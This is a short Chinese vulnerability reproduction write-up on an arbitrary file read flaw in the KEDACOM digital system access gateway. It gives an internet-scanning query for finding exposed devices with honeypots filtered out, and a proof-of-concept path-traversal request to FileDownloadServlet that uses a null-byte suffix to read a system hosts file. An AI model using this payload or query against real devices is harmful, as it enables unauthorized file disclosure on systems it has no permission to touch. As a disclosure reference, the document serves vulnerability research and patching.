---
title: "KEDACOM 数字系统接入网关 任意文件读取漏洞"
date: 2026-10-18 09:14:55
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "KEDACOM-数字系统接入网关"
tags:
  - "KEDACOM-数字系统接入网关"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件

## 漏洞影响

```
KEDACOM 数字系统接入网关
```

## 网络测绘

```
(app="KEDACOM-DVR接入网关") && (is_honeypot=false && is_fraud=false)
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162300072.png)

使用POC读取 /etc/hosts

```plain
/gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162300019.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/KEDACOM-%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
